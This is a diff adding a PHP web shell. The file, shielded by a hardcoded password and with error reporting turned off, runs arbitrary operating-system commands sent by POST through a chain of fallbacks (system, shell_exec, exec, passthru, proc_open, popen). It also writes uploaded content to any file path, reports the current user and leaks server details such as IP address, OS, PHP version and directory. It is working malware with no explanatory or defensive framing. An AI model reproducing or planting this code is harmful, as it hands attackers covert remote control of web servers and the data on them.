@@ -1,0 +1,100 @@
+error_reporting(0);
+$command = $_POST['cmd'];
+$type = $_POST['type'];
+$password_input = $_POST['password'];
+$password = 'password_change';
+$file = $_POST['file'];
+$body_file = $_POST['file_body'];
+if($password_input == $password){
+    if($type == "test"){
+        echo "suc_1";        
+    }elseif($type == "shell"){
+        echo execute($command);
+    }elseif($type == "upload"){
+        upload_file($file,$body_file);
+    }elseif($type == "checkos"){
+        if(is_win()){
+            echo trim(execute("echo %USERNAME%"));
+        }else{
+            echo trim(execute("whoami"));   
+        }
+    }elseif($type == "server_info"){
+        echo server_info();
+    }
+}else{
+    echo 'error_1';
+}
+
+function is_win(){
+    return (strtolower(substr(php_uname(),0,3)) == "win")? true : false;
+}
+
+function upload_file($file, $body_file){
+    $fp = fopen($file, 'w');
+    fwrite($fp, $body_file);
+    fclose($fp); 
+}
+
+function execute($code){
+	$output = "";
+	$code = $code." 2>&1";
+	if(is_callable('system') && function_exists('system')){
+		ob_start();
+		@system($code);
+		$output = ob_get_contents();
+		ob_end_clean();
+		if(!empty($output)) return $output;
+	}
+	elseif(is_callable('shell_exec') && function_exists('shell_exec')){
+		$output = @shell_exec($code);
+		if(!empty($output)) return $output;
+	}
+	elseif(is_callable('exec') && function_exists('exec')){
+		@exec($code,$res);
+		if(!empty($res)) foreach($res as $line) $output .= $line;
+		if(!empty($output)) return $output;
+	}
+	elseif(is_callable('passthru') && function_exists('passthru')){
+		ob_start();
+		@passthru($code);
+		$output = ob_get_contents();
+		ob_end_clean();
+		if(!empty($output)) return $output;
+	}
+	elseif(is_callable('proc_open') && function_exists('proc_open')){
+		$desc = array(
+			0 => array("pipe", "r"),
+			1 => array("pipe", "w"),
+			2 => array("pipe", "w"));
+		$proc = @proc_open($code, $desc, $pipes, getcwd(), array());
+		if(is_resource($proc)){
+			while($res = fgets($pipes[1])){
+				if(!empty($res)) $output .= $res;
+			}
+			while($res = fgets($pipes[2])){
+				if(!empty($res)) $output .= $res;
+			}
+		}
+		@proc_close($proc);
+		if(!empty($output)) return $output;
+	}
+	elseif(is_callable('popen') && function_exists('popen')){
+		$res = @popen($code, 'r');
+		if($res){
+			while(!feof($res)){
+				$output .= fread($res, 2096);
+			}
+			pclose($res);
+		}
+		if(!empty($output)) return $output;
+	}
+	return "";
+}
+
+function server_info(){
+    header('Content-Type: application/json');
+	$server_addr = isset($_SERVER['SERVER_ADDR'])? $_SERVER['SERVER_ADDR']:$_SERVER["HTTP_HOST"];
+	$server_software = (getenv('SERVER_SOFTWARE')!='')? getenv('SERVER_SOFTWARE')."":'';
+	$server_info = array("ip_address"=>$server_addr,"uname"=> php_uname(),"software"=>$server_software, "php_v"=>phpversion(), "dir"=>dirname(__FILE__));
+	return json_encode($server_info);
+}
